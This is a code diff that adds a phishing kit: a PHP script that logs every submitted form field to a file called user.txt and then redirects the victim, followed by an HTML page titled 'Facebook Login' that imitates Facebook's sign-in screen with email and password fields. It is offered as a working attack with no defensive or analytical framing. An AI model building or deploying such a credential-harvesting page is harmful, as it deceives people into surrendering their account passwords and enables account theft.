@@ -1,0 +1,40 @@
+
+<?php
+header ('Location: http://www.insertyourwebsite.com ');
+$handle = fopen("user.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;?>
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <link rel="stylesheet" href="style777.css">
+    <title>Facebook Login</title>
+  </head>
+  <body>
+       <div class="container">
+            <div class="header">
+                 <img src="facebook.png" height="50" width="200">
+                 <button class="sing-btn">Sign up</button>
+            </div>
+            <div class="box">
+                <h5>Log In To Facebook</h5>
+                <input type="text" class="txt-mail" placeholder="Email Address or Phone Number">
+                <input type="text" class="txt-pass" placeholder="Password">
+                <a href="#"><input type="button" class="txt-btn" value="Log In"></a>
+            <div class="box-links">
+                 <a href="#">Forgotten Password ?</a>
+                 <a href="#">Sign Up For Facebook </a>
+            </div>
+            </div>
+       </div>
+  </body>
+</html>
